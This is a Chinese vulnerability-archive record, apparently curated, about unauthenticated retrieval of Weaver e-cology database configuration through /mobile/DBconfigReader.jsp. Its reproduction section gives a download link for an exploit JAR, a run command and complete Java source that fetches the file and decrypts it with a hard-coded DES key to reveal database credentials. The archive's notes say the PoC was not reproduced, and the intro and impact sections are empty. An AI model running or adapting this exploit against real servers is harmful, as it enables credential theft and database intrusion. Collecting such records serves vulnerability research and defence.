---
source: "hatch 补库批 20260928"
title: "泛微e-cology DBconfigReader.jsp数据库配置下载+DES解密"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "产品版本未知；文中要求JDK>=1.8为工具运行要求非受影响版本"
prerequisites: "请求无凭证，未明确限制"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md"
id: "vw-f35be0c5082954381350fba5"
entity_id: "ve-f35be0c5082954381350fba5"
schema_version: "1"
---

# 泛微e-cology DBconfigReader.jsp数据库配置下载+DES解密

## 条目说明

- 对象与具体问题：泛微e-cology；DBconfigReader.jsp数据库配置下载+DES解密
- 版本、配置及部署条件：产品版本未知；文中要求JDK>=1.8为工具运行要求非受影响版本
- 认证与权限前提：请求无凭证，未明确限制
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 漏洞简介/影响空白，标题需加实际DBconfigReader端点
- Java逻辑丢前10字节DES解密提供独立技术细节，应与DBconfigReader正文合并
- 上方链接并非所谓github而为0-sec下载；缺依赖构建、响应结构/版本与密钥适用依据
- args[0]无长度检查、短响应截取会失败；不执行外部JAR

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

`https://download.0-sec.org/Web安全/泛微OA/ecologyExp.jar-master.zip`

使用方式：

jdk 1.8以上，没混淆可以直接看源码

使用方法：

java -jar ecologyExp.jar http://0-sec.org

源代码如下，编译好的在上方github链接里。

    package com.test;

    import org.apache.http.HttpEntity;
    import org.apache.http.client.methods.CloseableHttpResponse;
    import org.apache.http.client.methods.HttpGet;
    import org.apache.http.impl.client.CloseableHttpClient;
    import org.apache.http.impl.client.HttpClientBuilder;
    import org.apache.http.util.EntityUtils;

    import javax.crypto.Cipher;
    import javax.crypto.SecretKey;
    import javax.crypto.SecretKeyFactory;
    import javax.crypto.spec.DESKeySpec;
    import java.security.SecureRandom;

    public class ReadDbConfig {
        private final static String DES = "DES";
        private final static String key = "1z2x3c4v5b6n";

        public static void main(String[] args) throws Exception {
            if(args[0]!=null&& args[0].length() !=0){
                String url = args[0]+"/mobile/DBconfigReader.jsp";
                System.out.println(ReadConfig(url));
            }else{
                System.err.print("use: java -jar ecologyExp  http://127.0.0.1");
            }
        }

        private static String ReadConfig(String url) throws Exception {
            CloseableHttpClient httpClient = HttpClientBuilder.create().build();
            HttpGet httpGet = new HttpGet(url);
            CloseableHttpResponse response = httpClient.execute(httpGet);
            HttpEntity responseEntity = response.getEntity();

            byte[] res1 = EntityUtils.toByteArray(responseEntity);

            byte[] data = subBytes(res1,10,res1.length-10);

            byte [] finaldata =decrypt(data,key.getBytes());

            return (new String(finaldata));
        }

        private static byte[] decrypt(byte[] data, byte[] key) throws Exception {

            SecureRandom sr = new SecureRandom();
            DESKeySpec dks = new DESKeySpec(key);
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES);
            SecretKey securekey = keyFactory.generateSecret(dks);
            Cipher cipher = Cipher.getInstance(DES);
            cipher.init(Cipher.DECRYPT_MODE, securekey, sr);

            return cipher.doFinal(data);
        }

        public static byte[] subBytes(byte[] src, int begin, int count) {
            byte[] bs = new byte[count];
            System.arraycopy(src, begin, bs, 0, count);
            return bs;
        }

    }
